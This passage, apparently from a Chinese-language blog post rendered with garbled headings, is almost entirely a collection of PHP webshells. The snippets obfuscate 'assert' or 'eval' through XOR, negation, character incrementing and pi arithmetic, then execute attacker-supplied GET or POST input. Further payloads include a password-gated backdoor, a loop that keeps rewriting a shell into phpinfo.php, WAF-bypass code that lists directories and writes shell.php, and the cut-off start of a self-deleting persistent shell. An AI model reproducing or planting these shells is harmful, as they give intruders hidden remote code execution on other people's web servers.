class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="éšæœºå¼‚æˆ–"><a href="#éšæœºå¼‚æˆ–" class="headerlink" title="éšæœºå¼‚æˆ–"></a>éšæœºå¼‚æˆ–</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VONE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">HALB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$rlf</span> = <span class="string">&#x27;B&#x27;</span> ^ <span class="string">&quot;\x23&quot;</span>;</span><br><span class="line">        <span class="variable">$fzq</span> = <span class="string">&#x27;D&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$fgu</span> = <span class="string">&#x27;h&#x27;</span> ^ <span class="string">&quot;\x1b&quot;</span>;</span><br><span class="line">        <span class="variable">$sbe</span> = <span class="string">&#x27;R&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$gba</span> = <span class="string">&#x27;H&#x27;</span> ^ <span class="string">&quot;\x3a&quot;</span>;</span><br><span class="line">        <span class="variable">$oya</span> = <span class="string">&#x27;Y&#x27;</span> ^ <span class="string">&quot;\x2d&quot;</span>;</span><br><span class="line">        <span class="variable">$MWUC</span> = <span class="variable">$rlf</span> . <span class="variable">$fzq</span> . <span class="variable">$fgu</span> . <span class="variable">$sbe</span> . <span class="variable">$gba</span> . <span class="variable">$oya</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$MWUC</span>;&#125;<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$RNUJ</span> = <span class="keyword">$this</span>-&gt;HALB();</span><br><span class="line">        @<span class="variable">$RNUJ</span>(<span class="keyword">$this</span>-&gt;HY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$vone</span> = <span class="keyword">new</span> VONE();</span><br><span class="line">@<span class="variable">$vone</span>-&gt;HY = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;duitu&#x27;</span>]) ? base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]) : <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;çš„&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;åŠ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å§‹&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;ä¿¯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;æ¬¡&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç«™&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><h4 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*$_=[];</span></span><br><span class="line"><span class="comment">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="comment">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span></span><br><span class="line"><span class="comment">$___=$_; // A</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++; // E </span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$____=&#x27;_&#x27;;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$_=$$____;</span></span><br><span class="line"><span class="comment">$___($_[_]); // ASSERT($_POST[_]);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// V </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$___</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// L </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$___</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xg&#x27;</span>]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ— æ•°å­—"><a href="#æ— æ•°å­—" class="headerlink" title="æ— æ•°å­—"></a>æ— æ•°å­—</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=chr(floor(pow(pi(),ceil(pi())))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi())+ceil(pi())+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.chr( floor(pow(ceil(pi()),pi())-ceil(pi()+<span class="literal">true</span>+<span class="literal">true</span>))).chr(floor(pow(ceil(pi()),pi())-ceil(pi()+pi())-<span class="literal">true</span>)).chr(floor(pow(ceil(pi()),pi())+pow(pi()-<span class="literal">true</span>,pi()-<span class="literal">true</span>)+<span class="literal">true</span>+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQ"><a href="#QQQ" class="headerlink" title="QQQ"></a>QQQ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.3.0, PHP 7)</span></span><br><span class="line"><span class="comment"> * Referer: https://www.duitutu.cn/assnmsl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;duitutu.cn&quot;</span>;</span><br><span class="line"><span class="variable">$bypass</span> = substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>],-<span class="number">7</span>,-<span class="number">4</span>);</span><br><span class="line">forward_static_call_array(<span class="variable">$bypass</span>.<span class="string">&quot;ert&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQQQ"><a href="#QQQQQ" class="headerlink" title="QQQQQ"></a>QQQQQ</h4><p><code>shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line"><span class="variable">$shell</span> =</span><br><span class="line"><span class="string">&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>,base64_decode(<span class="variable">$shell</span>));</span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str2</span> = strtr(<span class="variable">$str1</span>,<span class="keyword">array</span>(<span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;</span>=&gt;<span class="string">&#x27;as&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)&#x27;</span>=&gt;<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;r&amp;%F%*^G*t&#x27;</span>=&gt;<span class="string">&#x27;rt&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str3</span> = strtr(<span class="variable">$str2</span>,<span class="keyword">array</span>(<span class="string">&#x27;s,&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;</span>=&gt;<span class="string">&#x27;er&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ==<span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str4</span> = strrev(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str5</span> = strrev(<span class="variable">$str4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str3</span>(<span class="variable">$str5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    e10adc3949ba59abbe56e057f20f883eçš„md5è§£å¯†ä¸º123456ï¼Œå³å¯†ç </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç»•-waf"><a href="#ç»•-waf" class="headerlink" title="ç»• waf"></a>ç»• waf</h3><h4 id="è¯»å–ç›®å½•"><a href="#è¯»å–ç›®å½•" class="headerlink" title="è¯»å–ç›®å½•"></a>è¯»å–ç›®å½•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$D</span>=<span class="string">&#x27;/var/www/html/&#x27;</span>;<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==<span class="literal">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=<span class="literal">NULL</span>;<span class="variable">$L</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span class="variable">$F</span>))&#123;<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$N</span>;<span class="variable">$T</span>=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime(<span class="variable">$P</span>));@<span class="variable">$E</span>=substr(base_convert(@fileperms(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);<span class="variable">$R</span>=<span class="string">&quot;\t&quot;</span>.<span class="variable">$T</span>.<span class="string">&quot;\t&quot;</span>.@filesize(<span class="variable">$P</span>).<span class="string">&quot;\t&quot;</span>.<span class="variable">$E</span>.<span class="string">&quot;\n&quot;</span>;<span class="keyword">if</span>(@is_dir(<span class="variable">$P</span>))<span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$R</span>;<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;&#125;<span class="keyword">echo</span> <span class="variable">$M</span>.<span class="variable">$L</span>;@closedir(<span class="variable">$F</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h4 id="å†™ğŸ"><a href="#å†™ğŸ" class="headerlink" title="å†™ğŸ"></a>å†™ğŸ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$f</span>=<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>];<span class="variable">$c</span>=str_replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$c</span>=str_replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);<span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=urldecode(<span class="string">&#x27;%&#x27;</span>.substr(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));<span class="keyword">echo</span>(@fwrite(fopen(<span class="variable">$f</span>,<span class="string">&#x27;w&#x27;</span>),<span class="variable">$buf</span>)?<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;0&#x27;</span>);;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜ä¸æ­»ğŸ"><a href="#å†…å­˜ä¸æ­»ğŸ" class="headerlink" title="å†…å­˜ä¸æ­»ğŸ"></a>å†…å­˜ä¸æ­»ğŸ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="comment">//$file = &#x27;D:\phpstudy_pro\WWW\h\.shell.php&#x27;;</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php 